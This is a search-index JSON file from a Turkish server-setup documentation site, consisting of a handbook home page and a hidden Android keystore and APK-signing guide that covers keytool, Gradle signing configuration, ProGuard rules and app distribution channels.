{"config":{"lang":["tr"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Sunucu Kurulum El Kitab\u0131","text":""},{"location":"#production-ready-sunucu-mimarisi-sfrdan-canlya","title":"Production-Ready Sunucu Mimarisi: S\u0131f\u0131rdan Canl\u0131ya. \ud83d\ude80","text":"<p>Bu rehber, rastgele blog yaz\u0131lar\u0131n\u0131n birle\u015fimi de\u011fildir. G\u00fcvenlik, Performans ve S\u00fcrd\u00fcr\u00fclebilirlik odakl\u0131, sava\u015fta test edilmi\u015f (battle-tested) bir kurulum standard\u0131d\u0131r.</p> <p>\ud83d\udd25 30 Saniyede \u00d6zet: Modern bir Linux sunucusu sadece \"\u00e7al\u0131\u015fan\" de\u011fil, \"kendini savunan\" ve \"ne yapt\u0131\u011f\u0131n\u0131 anlatan\" bir yap\u0131da olmal\u0131d\u0131r.</p>"},{"location":"#neden-bu-rehber","title":"Neden Bu Rehber? \ud83c\udfdb\ufe0f","text":"<p>A\u015fa\u011f\u0131daki \u00fc\u00e7 prensip, bu el kitab\u0131n\u0131n temelini olu\u015fturur:</p> \ud83d\udee1\ufe0f G\u00fcvenlik (Security) \u26a1 Performans (Performance) \ud83e\uddd8 Sadelik (Simplicity) \"Firewall'u kapat\u0131p deneyelim\" yok. 15 Katmanl\u0131 Savunma stratejisi ile her ad\u0131m\u0131 g\u00fcvenli at\u0131yoruz. Varsay\u0131lan ayarlar yetersizdir. Kernel tuning, Nginx hardening ve minimal Docker imajlar\u0131 ile maksimum verim. Grafik aray\u00fczler ve gereksiz ara\u00e7lar yok (Zero Bloat). Sadece i\u015fini yapan, temiz CLI ara\u00e7lar\u0131."},{"location":"#hzl-erisim-portal","title":"H\u0131zl\u0131 Eri\u015fim (Portal) \ud83d\uddc2\ufe0f","text":"<p>\u0130htiyac\u0131n\u0131z olan b\u00f6l\u00fcme do\u011frudan gidin:</p> \ud83d\ude80 Ba\u015flang\u0131\u00e7 \ud83d\udd12 G\u00fcvenlik Merkezi - Temel OS Kurulumu- Kullan\u0131c\u0131 Y\u00f6netimi- Swap &amp; Disk- \u0130lk Kurulum Checklist - 15 Katmanl\u0131 G\u00fcvenlik Mimarisi \u2b50- SSH Hardening- Firewall (UFW)- Malware &amp; Rootkit \ud83e\udd58 Uygulama Re\u00e7eteleri \u2601\ufe0f Cloud &amp; Operasyon - .NET Core Hardening \ud83d\udd37- React + Nginx \u269b\ufe0f- PostgreSQL Tuning \ud83d\udc18- Nginx Proxy \ud83c\udf10 - Oracle Cloud Kurulumu- AWS Altyap\u0131s\u0131- Yedekleme Stratejisi- Acil Durum (Runbooks) \ud83d\udea8"},{"location":"#one-ckanlar","title":"\u00d6ne \u00c7\u0131kanlar \u2b50","text":"<p>Docker Kullananlar Dikkat!</p> <p>S\u0131radan bir <code>docker-compose.yml</code> dosyas\u0131 sunucunuzu riske atabilir. Master Docker Security Guide rehberini okumadan production'a \u00e7\u0131kmay\u0131n!</p> <p>G\u00fcvenlik Bir Eklenti De\u011fildir</p> <p>Sunucunuzu kurduktan sonra Lynis Audit ile tarat\u0131p puan\u0131n\u0131z\u0131 g\u00f6rmeyi unutmay\u0131n. Hedef: 80+</p>"},{"location":"#katkda-bulunun","title":"Katk\u0131da Bulunun \ud83e\udd1d","text":"<p>Bu ya\u015fayan bir dok\u00fcmand\u0131r. Hatal\u0131 g\u00f6rd\u00fc\u011f\u00fcn\u00fcz veya geli\u015ftirmek istedi\u011finiz bir nokta varsa, l\u00fctfen Pull Request g\u00f6nderin veya Issue a\u00e7\u0131n.</p>"},{"location":"keystore%20copy/","title":"Android Keystore ve APK \u0130mzalama Rehberi","text":"<p>[!WARNING] Gizli D\u00f6k\u00fcman: Bu sayfa navigasyonda g\u00f6r\u00fcnmez. Sadece do\u011frudan URL ile eri\u015filebilir.</p> <p>G\u00fcvenlik Uyar\u0131s\u0131: Keystore dosyas\u0131 ve \u015fifreleri asla Git'e commit etmeyin!</p> <p>React Native Android uygulaman\u0131z\u0131 Google Play Store'a y\u00fcklemek i\u00e7in APK/AAB dosyas\u0131n\u0131 imzalaman\u0131z gerekir. Bu rehber t\u00fcm s\u00fcreci ad\u0131m ad\u0131m anlat\u0131r.</p>"},{"location":"keystore%20copy/#1-keystore-nedir","title":"1. Keystore Nedir? \ud83d\udd11","text":"<p>Keystore, Android uygulaman\u0131z\u0131 imzalamak i\u00e7in kullan\u0131lan dijital sertifika deposudur.</p> <p>\u00d6nemli Noktalar:</p> <ul> <li>Her uygulama benzersiz bir keystore ile imzalanmal\u0131d\u0131r</li> <li>Keystore kaybedilirse, uygulaman\u0131z\u0131 asla g\u00fcncelleyemezsiniz</li> <li>Google Play, ayn\u0131 keystore ile imzalanm\u0131\u015f APK'lar\u0131 ayn\u0131 uygulama olarak tan\u0131r</li> <li>Keystore \u015fifresini unutmay\u0131n - kurtarma yolu yoktur!</li> </ul>"},{"location":"keystore%20copy/#11-tek-keystore-vs-coklu-keystore-cok-onemli","title":"1.1. Tek Keystore vs \u00c7oklu Keystore (\u00c7ok \u00d6nemli!) \ud83c\udfaf","text":"<p>[!CAUTION] Birden fazla uygulama geli\u015ftiriyorsan\u0131z:</p> <p>\u274c YANLI\u015e: T\u00fcm uygulamalar i\u00e7in ayn\u0131 keystore \u2705 DO\u011eRU: Her uygulama i\u00e7in ayr\u0131 keystore</p> <p>Neden Her Uygulama \u0130\u00e7in Ayr\u0131 Keystore?</p> Senaryo Tek Keystore \u00c7oklu Keystore G\u00fcvenlik \u274c Bir keystore s\u0131zarsa t\u00fcm uygulamalar risk alt\u0131nda \u2705 Sadece 1 uygulama etkilenir Uygulama Sat\u0131\u015f\u0131 \u274c Keystore'u payla\u015fmak zorunda kal\u0131rs\u0131n \u2705 Sadece o uygulaman\u0131n keystore'unu verirsin Organizasyon \u274c Hangi keystore hangi app'e ait belli de\u011fil \u2705 Her keystore a\u00e7\u0131k\u00e7a etiketli Keystore Kayb\u0131 \u274c T\u00fcm uygulamalar g\u00fcncelleme alamaz \u2705 Sadece 1 uygulama etkilenir <p>\u00d6nerilen \u0130simlendirme:</p> <pre><code># \u274c YANLI\u015e (genel isim)\nmy-upload-key.keystore\n\n# \u2705 DO\u011eRU (uygulama \u00f6zel)\nexpense-tracker-upload-key.keystore\ntodo-app-upload-key.keystore\nfitness-app-upload-key.keystore\n</code></pre> <p>Dosya Yap\u0131s\u0131 \u00d6rne\u011fi:</p> <pre><code>~/keystores/\n\u251c\u2500\u2500 expense-tracker/\n\u2502   \u251c\u2500\u2500 expense-tracker-upload-key.keystore\n\u2502   \u2514\u2500\u2500 keystore-info.txt  (\u015fifreler, alias)\n\u251c\u2500\u2500 todo-app/\n\u2502   \u251c\u2500\u2500 todo-app-upload-key.keystore\n\u2502   \u2514\u2500\u2500 keystore-info.txt\n\u2514\u2500\u2500 fitness-app/\n    \u251c\u2500\u2500 fitness-app-upload-key.keystore\n    \u2514\u2500\u2500 keystore-info.txt\n</code></pre> <p>[!TIP] Best Practice:</p> <ul> <li>Her uygulama i\u00e7in ayr\u0131 klas\u00f6r</li> <li>Keystore ad\u0131nda uygulama ad\u0131 olsun</li> <li>\u015eifreleri <code>keystore-info.txt</code> dosyas\u0131nda sakla (\u015fifreli cloud'da)</li> </ul>"},{"location":"keystore%20copy/#2-keystore-olusturma","title":"2. Keystore Olu\u015fturma \ud83d\udee0\ufe0f","text":""},{"location":"keystore%20copy/#21-gereksinimler","title":"2.1. Gereksinimler","text":"<pre><code># Java JDK kurulu olmal\u0131 (React Native s\u00fcr\u00fcm\u00fcn\u00fcze uygun)\njava -version\n\n# keytool komutu JDK ile gelir\nkeytool -version\n</code></pre> <p>[!IMPORTANT] JDK S\u00fcr\u00fcm Uyumlulu\u011fu:</p> <ul> <li>React Native 0.73+: JDK 17 (\u00f6nerilen)</li> <li>React Native 0.68-0.72: JDK 11 veya 17</li> <li>Eski versiyonlar: JDK 8 veya 11</li> </ul> <p>Yanl\u0131\u015f JDK s\u00fcr\u00fcm\u00fc build hatalar\u0131na neden olur!</p>"},{"location":"keystore%20copy/#22-keystore-olusturma-komutu","title":"2.2. Keystore Olu\u015fturma Komutu","text":"<pre><code># Proje root dizininde\ncd android/app\n\n# Keystore olu\u015ftur (\u00d6NER\u0130LEN)\nkeytool -genkeypair -v \\\n  -storetype PKCS12 \\\n  -keystore my-upload-key.keystore \\\n  -alias my-key-alias \\\n  -keyalg RSA \\\n  -keysize 2048 \\\n  -validity 10000 \\\n  -sigalg SHA256withRSA\n</code></pre> <p>Parametreler:</p> <ul> <li><code>-storetype PKCS12</code>: Modern keystore format\u0131 (\u00f6nerilen)</li> <li><code>-keystore my-upload-key.keystore</code>: Keystore dosya ad\u0131</li> <li><code>-alias my-key-alias</code>: Key alias (hat\u0131rlay\u0131n!)</li> <li><code>-keyalg RSA</code>: Algoritma</li> <li><code>-keysize 2048</code>: Key boyutu</li> <li><code>-validity 10000</code>: Ge\u00e7erlilik s\u00fcresi (g\u00fcn) - Minimum 25 y\u0131l gerekli!</li> <li><code>-sigalg SHA256withRSA</code>: \u0130mza algoritmas\u0131 (uyumluluk i\u00e7in)</li> </ul> <p>[!CAUTION] validity Parametresi Kritik: Google Play, sertifikan\u0131n en az 22 Ekim 2033 tarihine kadar ge\u00e7erli olmas\u0131n\u0131 \u015fart ko\u015far. 10000 g\u00fcnden (27 y\u0131l) az verilirse ileride g\u00fcncelleme sorunu ya\u015fanabilir!</p>"},{"location":"keystore%20copy/#23-istenecek-bilgiler","title":"2.3. \u0130stenecek Bilgiler","text":"<pre><code>Enter keystore password: ********\nRe-enter new password: ********\n\nWhat is your first and last name?\n  [Unknown]:  John Doe\n\nWhat is the name of your organizational unit?\n  [Unknown]:  Development\n\nWhat is the name of your organization?\n  [Unknown]:  MyCompany\n\nWhat is the name of your City or Locality?\n  [Unknown]:  Istanbul\n\nWhat is the name of your State or Province?\n  [Unknown]:  Istanbul\n\nWhat is the two-letter country code for this unit?\n  [Unknown]:  TR\n\nIs CN=John Doe, OU=Development, O=MyCompany, L=Istanbul, ST=Istanbul, C=TR correct?\n  [no]:  yes\n\nEnter key password for &lt;my-key-alias&gt;\n        (RETURN if same as keystore password): ********\n</code></pre> <p>[!IMPORTANT] \u015eifreleri Kaydedin:</p> <ul> <li>Keystore password</li> <li>Key alias</li> <li>Key password</li> </ul> <p>Bu bilgileri g\u00fcvenli bir yerde (password manager) saklay\u0131n!</p>"},{"location":"keystore%20copy/#3-keystoreu-guvenli-saklama","title":"3. Keystore'u G\u00fcvenli Saklama \ud83d\udd12","text":""},{"location":"keystore%20copy/#31-gitignorea-ekleyin","title":"3.1. .gitignore'a Ekleyin","text":"<pre><code># android/app/.gitignore\n*.keystore\n*.jks\n</code></pre>"},{"location":"keystore%20copy/#32-yedekleme","title":"3.2. Yedekleme","text":"<pre><code># Keystore'u g\u00fcvenli bir yere yedekleyin\n# \u00d6rnek: \u015eifreli cloud storage, password manager\n\n# \u00d6NEML\u0130: Birden fazla yerde yedek tutun!\n# - Cloud storage (\u015fifreli)\n# - External hard drive\n# - Password manager\n</code></pre>"},{"location":"keystore%20copy/#33-keystore-bilgilerini-saklama","title":"3.3. Keystore Bilgilerini Saklama","text":"<p>gradle.properties (local):</p> <pre><code># android/gradle.properties (GIT'E EKLEMEY\u0130N!)\nMYAPP_UPLOAD_STORE_FILE=my-upload-key.keystore\nMYAPP_UPLOAD_KEY_ALIAS=my-key-alias\nMYAPP_UPLOAD_STORE_PASSWORD=your_keystore_password\nMYAPP_UPLOAD_KEY_PASSWORD=your_key_password\n</code></pre> <p>[!WARNING] <code>gradle.properties</code> dosyas\u0131n\u0131 asla Git'e eklemeyin!</p>"},{"location":"keystore%20copy/#4-gradle-konfigurasyonu","title":"4. Gradle Konfig\u00fcrasyonu \u2699\ufe0f","text":""},{"location":"keystore%20copy/#41-androidappbuildgradle-hibrit-yaklasm","title":"4.1. android/app/build.gradle (Hibrit Yakla\u015f\u0131m)","text":"<pre><code>android {\n    ...\n    defaultConfig { ... }\n\n    // Signing configs (Env Vars &gt; gradle.properties)\n    signingConfigs {\n        debug {\n            storeFile file('debug.keystore')\n            storePassword 'android'\n            keyAlias 'androiddebugkey'\n            keyPassword 'android'\n        }\n        release {\n            // \u00d6ncelik: Environment Variables -&gt; gradle.properties\n            def keystoreFile = System.getenv(\"MYAPP_UPLOAD_STORE_FILE\") ?: project.findProperty(\"MYAPP_UPLOAD_STORE_FILE\")\n            def keystorePassword = System.getenv(\"MYAPP_UPLOAD_STORE_PASSWORD\") ?: project.findProperty(\"MYAPP_UPLOAD_STORE_PASSWORD\")\n            def keyAlias = System.getenv(\"MYAPP_UPLOAD_KEY_ALIAS\") ?: project.findProperty(\"MYAPP_UPLOAD_KEY_ALIAS\")\n            def keyPassword = System.getenv(\"MYAPP_UPLOAD_KEY_PASSWORD\") ?: project.findProperty(\"MYAPP_UPLOAD_KEY_PASSWORD\")\n\n            if (keystoreFile) {\n                storeFile file(keystoreFile)\n                storePassword keystorePassword\n                keyAlias keyAlias\n                keyPassword keyPassword\n            }\n        }\n    }\n\n    buildTypes {\n        debug {\n            signingConfig signingConfigs.debug\n        }\n        release {\n            // Proguard/R8 minification\n            minifyEnabled true\n            shrinkResources true\n            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'\n\n            // Signing\n            signingConfig signingConfigs.release\n        }\n    }\n}\n</code></pre> <p>[!TIP] Hibrit Yakla\u015f\u0131m Avantajlar\u0131:</p> <ul> <li>Local development: <code>gradle.properties</code> kullan\u0131r</li> <li>CI/CD: Environment variables kullan\u0131r (daha g\u00fcvenli)</li> <li><code>gradle.properties</code> dosyas\u0131 olu\u015fturmaya gerek kalmaz</li> </ul>"},{"location":"keystore%20copy/#42-proguardr8-rules-detayl","title":"4.2. ProGuard/R8 Rules (Detayl\u0131)","text":"<pre><code># android/app/proguard-rules.pro\n\n# ===== React Native Core =====\n-keep class com.facebook.react.** { *; }\n-keep class com.facebook.hermes.** { *; }\n-keep class com.facebook.jni.** { *; }\n\n# React Native Gesture Handler\n-keep class com.swmansion.gesturehandler.** { *; }\n\n# React Native Reanimated\n-keep class com.swmansion.reanimated.** { *; }\n\n# ===== Retrofit (API Calls) =====\n-keepattributes Signature\n-keepattributes *Annotation*\n-keep class retrofit2.** { *; }\n-keepclasseswithmembers class * {\n    @retrofit2.http.* &lt;methods&gt;;\n}\n\n# ===== OkHttp =====\n-dontwarn okhttp3.**\n-dontwarn okio.**\n-keep class okhttp3.** { *; }\n-keep interface okhttp3.** { *; }\n\n# ===== Gson/JSON =====\n-keep class com.google.gson.** { *; }\n-keepclassmembers,allowobfuscation class * {\n  @com.google.gson.annotations.SerializedName &lt;fields&gt;;\n}\n\n# ===== Firebase =====\n-keep class com.google.firebase.** { *; }\n-keep class com.google.android.gms.** { *; }\n-dontwarn com.google.firebase.**\n\n# ===== Your App Models =====\n-keep class com.yourapp.models.** { *; }\n-keep class com.yourapp.api.** { *; }\n\n# ===== General =====\n-keepattributes SourceFile,LineNumberTable\n-keepattributes *Annotation*\n-renamesourcefileattribute SourceFile\n</code></pre>"},{"location":"keystore%20copy/#5-release-apkaab-olusturma","title":"5. Release APK/AAB Olu\u015fturma \ud83d\udce6","text":""},{"location":"keystore%20copy/#51-aab-android-app-bundle-onerilen","title":"5.1. AAB (Android App Bundle) - \u00d6nerilen","text":"<pre><code># Proje root dizininde\ncd android\n\n# Release AAB olu\u015ftur\n./gradlew bundleRelease\n\n# \u00c7\u0131kt\u0131:\n# android/app/build/outputs/bundle/release/app-release.aab\n</code></pre>"},{"location":"keystore%20copy/#52-apk-alternative","title":"5.2. APK (Alternative)","text":"<pre><code># Release APK olu\u015ftur\n./gradlew assembleRelease\n\n# \u00c7\u0131kt\u0131:\n# android/app/build/outputs/apk/release/app-release.apk\n</code></pre>"},{"location":"keystore%20copy/#53-build-temizleme","title":"5.3. Build Temizleme","text":"<pre><code># Cache temizle\n./gradlew clean\n\n# Sonra tekrar build\n./gradlew bundleRelease\n</code></pre>"},{"location":"keystore%20copy/#54-aab-vs-apk-hangisini-kullanmal","title":"5.4. AAB vs APK: Hangisini Kullanmal\u0131? \ud83e\udd14","text":"<p>[!IMPORTANT] Google Play: AAB zorunlu (2021'den beri) Di\u011fer platformlar: APK kullan\u0131labilir</p> <p>Kar\u015f\u0131la\u015ft\u0131rma:</p> \u00d6zellik AAB (Android App Bundle) APK (Android Package) Google Play \u2705 Zorunlu \u274c Art\u0131k kabul edilmiyor Dosya Boyutu \u2705 %35 daha k\u00fc\u00e7\u00fck \u274c Daha b\u00fcy\u00fck Optimizasyon \u2705 Cihaza \u00f6zel \u274c Evrensel Direkt Y\u00fckleme \u274c M\u00fcmk\u00fcn de\u011fil \u2705 M\u00fcmk\u00fcn F-Droid \u274c Desteklemiyor \u2705 Destekliyor GitHub Releases \u274c Kullan\u0131c\u0131 y\u00fckleyemez \u2705 Direkt indirip y\u00fckler <p>Ne Zaman AAB?</p> <ul> <li>\u2705 Google Play Store'a y\u00fckleme</li> <li>\u2705 Dosya boyutu \u00f6nemli</li> <li>\u2705 Otomatik optimizasyon istiyorsan\u0131z</li> </ul> <p>Ne Zaman APK?</p> <ul> <li>\u2705 Direkt kullan\u0131c\u0131lara da\u011f\u0131t\u0131m</li> <li>\u2705 F-Droid, APKPure gibi alternatif ma\u011fazalar</li> <li>\u2705 GitHub Releases</li> <li>\u2705 Kendi web sitenizden indirme</li> <li>\u2705 Beta test (Google Play d\u0131\u015f\u0131nda)</li> </ul>"},{"location":"keystore%20copy/#55-alternatif-dagtm-kanallar-apk","title":"5.5. Alternatif Da\u011f\u0131t\u0131m Kanallar\u0131 (APK)","text":""},{"location":"keystore%20copy/#1-f-droid-ack-kaynak-uygulamalar","title":"1. F-Droid (A\u00e7\u0131k Kaynak Uygulamalar)","text":"<p>F-Droid Nedir?</p> <ul> <li>A\u00e7\u0131k kaynak Android uygulamalar\u0131 i\u00e7in alternatif ma\u011faza</li> <li>Tamamen \u00fccretsiz ve reklams\u0131z</li> <li>Gizlilik odakl\u0131 (tracking yok)</li> <li>Kaynak kodu a\u00e7\u0131k olmal\u0131</li> </ul> <p>Nas\u0131l Yay\u0131nlan\u0131r?</p> <pre><code># 1. Uygulaman\u0131z\u0131 a\u00e7\u0131k kaynak yap\u0131n (GitHub)\n# 2. F-Droid'e ba\u015fvuru yap\u0131n\n# https://f-droid.org/docs/Inclusion_Policy/\n\n# 3. Metadata dosyas\u0131 olu\u015fturun\n# fdroiddata/metadata/com.yourapp.txt\n\n# 4. F-Droid build server'\u0131 APK'y\u0131 olu\u015fturur\n# (Sizin keystore'unuz kullan\u0131lmaz, F-Droid'in kendi keystore'u)\n</code></pre> <p>Avantajlar:</p> <ul> <li>\u2705 Tamamen \u00fccretsiz</li> <li>\u2705 Gizlilik odakl\u0131 kullan\u0131c\u0131lar</li> <li>\u2705 Otomatik g\u00fcncellemeler</li> <li>\u2705 Google Play'e alternatif</li> </ul> <p>Dezavantajlar:</p> <ul> <li>\u274c Kaynak kodu a\u00e7\u0131k olmal\u0131</li> <li>\u274c F-Droid kendi keystore'u kullan\u0131r (Google Play ile ayn\u0131 APK de\u011fil)</li> <li>\u274c \u0130nceleme s\u00fcreci uzun (haftalar)</li> </ul>"},{"location":"keystore%20copy/#2-github-releases-en-kolay","title":"2. GitHub Releases (En Kolay)","text":"<p>Nas\u0131l Yap\u0131l\u0131r?</p> <pre><code># 1. Release APK olu\u015ftur\ncd android &amp;&amp; ./gradlew assembleRelease\n\n# 2. GitHub'da release olu\u015ftur\n# Repository \u2192 Releases \u2192 Create new release\n\n# 3. APK'y\u0131 upload et\n# Tag: v1.0.0\n# Title: Version 1.0.0\n# Description: Release notes\n# Assets: app-release.apk (upload)\n\n# 4. Publish release\n</code></pre> <p>Kullan\u0131c\u0131 \u0130ndirme:</p> <pre><code>https://github.com/yourname/yourapp/releases/latest\n\u2192 app-release.apk indir\n\u2192 Cihaza y\u00fckle (Unknown sources aktif olmal\u0131)\n</code></pre> <p>Avantajlar:</p> <ul> <li>\u2705 \u00c7ok kolay</li> <li>\u2705 \u00dccretsiz</li> <li>\u2705 Versiyon kontrol\u00fc</li> <li>\u2705 Changelog ekleyebilirsin</li> </ul> <p>Dezavantajlar:</p> <ul> <li>\u274c Otomatik g\u00fcncelleme yok</li> <li>\u274c Kullan\u0131c\u0131 \"Unknown sources\" aktif etmeli</li> <li>\u274c Google Play kadar g\u00fcvenilir de\u011fil (kullan\u0131c\u0131 g\u00f6z\u00fcnde)</li> </ul>"},{"location":"keystore%20copy/#3-apkpure-apkmirror","title":"3. APKPure / APKMirror","text":"<p>APKPure:</p> <ul> <li>\u00dc\u00e7\u00fcnc\u00fc parti APK ma\u011fazas\u0131</li> <li>Ba\u015fvuru: https://apkpure.com/developer</li> <li>\u00dccretsiz</li> </ul> <p>APKMirror:</p> <ul> <li>Sadece pop\u00fcler uygulamalar</li> <li>Ba\u015fvuru: https://www.apkmirror.com/apk-upload/</li> </ul>"},{"location":"keystore%20copy/#4-kendi-web-siteniz","title":"4. Kendi Web Siteniz","text":"<p>Basit Y\u00f6ntem:</p> <pre><code>&lt;!-- index.html --&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;MyApp Download&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;h1&gt;Download MyApp&lt;/h1&gt;\n    &lt;a href=\"app-release.apk\" download&gt;\n      &lt;button&gt;Download APK (v1.0.0)&lt;/button&gt;\n    &lt;/a&gt;\n\n    &lt;h2&gt;Installation:&lt;/h2&gt;\n    &lt;ol&gt;\n      &lt;li&gt;Download APK&lt;/li&gt;\n      &lt;li&gt;Settings \u2192 Security \u2192 Enable \"Unknown sources\"&lt;/li&gt;\n      &lt;li&gt;Open APK file&lt;/li&gt;\n      &lt;li&gt;Install&lt;/li&gt;\n    &lt;/ol&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Hosting:</p> <ul> <li>GitHub Pages (\u00fccretsiz)</li> <li>Netlify (\u00fccretsiz)</li> <li>Vercel (\u00fccretsiz)</li> <li>Kendi sunucunuz</li> </ul>"},{"location":"keystore%20copy/#5-samsung-galaxy-store","title":"5. Samsung Galaxy Store","text":"<p>Samsung cihazlar i\u00e7in alternatif:</p> <ul> <li>https://seller.samsungapps.com/</li> <li>APK kabul ediyor (AAB de\u011fil)</li> <li>Samsung cihazlarda pre-installed</li> </ul>"},{"location":"keystore%20copy/#56-dagtm-stratejisi-onerisi","title":"5.6. Da\u011f\u0131t\u0131m Stratejisi \u00d6nerisi","text":"<p>\u00c7oklu Platform Stratejisi:</p> <pre><code>1. Google Play Store (AAB)\n   \u251c\u2500 Ana da\u011f\u0131t\u0131m kanal\u0131\n   \u251c\u2500 Otomatik g\u00fcncellemeler\n   \u2514\u2500 En geni\u015f kitle\n\n2. F-Droid (APK - a\u00e7\u0131k kaynak)\n   \u251c\u2500 Gizlilik odakl\u0131 kullan\u0131c\u0131lar\n   \u251c\u2500 A\u00e7\u0131k kaynak toplulu\u011fu\n   \u2514\u2500 Google-free cihazlar\n\n3. GitHub Releases (APK)\n   \u251c\u2500 Beta testerlar\n   \u251c\u2500 Erken eri\u015fim\n   \u2514\u2500 Geli\u015ftirici toplulu\u011fu\n\n4. Kendi Web Siteniz (APK)\n   \u251c\u2500 Direkt kontrol\n   \u251c\u2500 Analytics\n   \u2514\u2500 \u00d6zel landing page\n</code></pre> <p>\u00d6rnek Senaryo:</p> <pre><code># 1. Google Play i\u00e7in AAB\n./gradlew bundleRelease\n# \u2192 Play Console'a y\u00fckle\n\n# 2. F-Droid / GitHub / Web i\u00e7in APK\n./gradlew assembleRelease\n# \u2192 GitHub Releases'e y\u00fckle\n# \u2192 Web sitene y\u00fckle\n</code></pre> <p>[!TIP] Best Practice:</p> <ul> <li>Google Play: AAB (zorunlu)</li> <li>Di\u011fer her yer: APK</li> <li>Her ikisini de ayn\u0131 keystore ile imzala!</li> </ul>"},{"location":"keystore%20copy/#6-apkaab-test-etme","title":"6. APK/AAB Test Etme \ud83e\uddea","text":""},{"location":"keystore%20copy/#61-aabyi-apkya-cevirme-test-icin","title":"6.1. AAB'yi APK'ya \u00c7evirme (Test \u0130\u00e7in)","text":"<pre><code># bundletool indir\n# https://github.com/google/bundletool/releases\n\n# AAB'den APK olu\u015ftur\njava -jar bundletool.jar build-apks \\\n  --bundle=app-release.aab \\\n  --output=app-release.apks \\\n  --mode=universal\n\n# APK'y\u0131 extract et\nunzip app-release.apks -d output\n\n# Cihaza y\u00fckle\nadb install output/universal.apk\n</code></pre>"},{"location":"keystore%20copy/#62-imza-dogrulama","title":"6.2. \u0130mza Do\u011frulama","text":"<pre><code># APK imzas\u0131n\u0131 kontrol et\njarsigner -verify -verbose -certs app-release.apk\n\n# Detayl\u0131 bilgi\nkeytool -printcert -jarfile app-release.apk\n</code></pre>"},{"location":"keystore%20copy/#7-google-play-upload","title":"7. Google Play Upload \ud83d\ude80","text":""},{"location":"keystore%20copy/#71-play-consoleda-uygulama-olusturma","title":"7.1. Play Console'da Uygulama Olu\u015fturma","text":"<ol> <li>Google Play Console'a girin</li> <li>\"Create app\" t\u0131klay\u0131n</li> <li>Uygulama bilgilerini doldurun</li> <li>\"Create app\" t\u0131klay\u0131n</li> </ol>"},{"location":"keystore%20copy/#72-aab-upload","title":"7.2. AAB Upload","text":"<ol> <li>Production &gt; Releases &gt; Create new release</li> <li>AAB dosyas\u0131n\u0131 upload edin</li> <li>Release notes ekleyin</li> <li>Review release &gt; Start rollout to production</li> </ol>"},{"location":"keystore%20copy/#73-app-signing-by-google-play-onerilen","title":"7.3. App Signing by Google Play (\u00d6nerilen)","text":"<p>[!CAUTION] ZORUNLU HALE GEL\u0130YOR (2025): Google Play App Signing, 2025 sonuna kadar t\u00fcm yeni uygulamalar i\u00e7in zorunlu olacak! Mevcut uygulamalar i\u00e7in de \u015fiddetle \u00f6nerilir.</p> <p>[!TIP] Google Play App Signing kullanman\u0131z \u00f6nerilir:</p> <ul> <li>Google, keystore'unuzu y\u00f6netir</li> <li>Keystore kayb\u0131 riski ortadan kalkar</li> <li>Upload key ile signing key ayr\u0131l\u0131r</li> </ul> <p>Nas\u0131l Aktif Edilir:</p> <ol> <li>Play Console &gt; Setup &gt; App signing</li> <li>Use Google Play App Signing se\u00e7in</li> <li>Upload key'inizi y\u00fckleyin</li> </ol> <p>Upload Key vs Signing Key:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502      Sen        \u2502    \u2502   Google Play    \u2502    \u2502   Kullan\u0131c\u0131     \u2502\n\u2502  Upload Key     \u2502 \u2500\u2500\u25ba\u2502  Signing Key     \u2502 \u2500\u2500\u25ba\u2502   \u0130ndirir       \u2502\n\u2502   (senin)       \u2502    \u2502  (Google'\u0131n)     \u2502    \u2502                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Farklar:</p> \u00d6zellik Upload Key Signing Key Sahibi Sen olu\u015fturursun Google saklar Kullan\u0131m AAB'yi Google'a y\u00fcklerken Cihazlara da\u011f\u0131t\u0131rken Kaybedilirse \u2705 Yenilenebilir \u274c Google saklar, sorun yok G\u00fcvenlik Senin sorumlulu\u011fun Google'\u0131n sorumlulu\u011fu <p>[!TIP] Mevcut Uygulamay\u0131 App Signing'e Ta\u015f\u0131ma:</p> <p>E\u011fer daha \u00f6nce App Signing olmadan yay\u0131nlad\u0131ysan\u0131z:</p> <ol> <li>Play Console \u2192 Setup \u2192 App signing</li> <li>\"Use a different key\" se\u00e7</li> <li>PEPK tool ile mevcut keystore'u export et:</li> </ol> <pre><code>java -jar pepk.jar \\\n  --keystore=my-upload-key.keystore \\\n  --alias=my-key-alias \\\n  --output=encrypted_private_key.zip \\\n  --encryptionkey=GOOGLE_PROVIDED_KEY\n</code></pre> <ol> <li><code>encrypted_private_key.zip</code>'i upload et</li> </ol>"},{"location":"keystore%20copy/#74-apk-imza-semalar-v1v2v3","title":"7.4. APK \u0130mza \u015eemalar\u0131 (V1/V2/V3)","text":"<p>\u0130mza \u015eemalar\u0131:</p> \u015eema Android A\u00e7\u0131klama V1 (JAR) T\u00fcm\u00fc Eski y\u00f6ntem, yava\u015f do\u011frulama V2 7.0+ APK Signature Scheme v2 V3 9.0+ Key rotation deste\u011fi V4 11+ Incremental installs <p>Gradle Konfig\u00fcrasyonu:</p> <pre><code>// android/app/build.gradle\nandroid {\n    signingConfigs {\n        release {\n            // ... (keystore config)\n\n            // \u0130mza \u015femalar\u0131n\u0131 aktif et\n            v1SigningEnabled true\n            v2SigningEnabled true\n            enableV3Signing true  // Key rotation (API 28+)\n            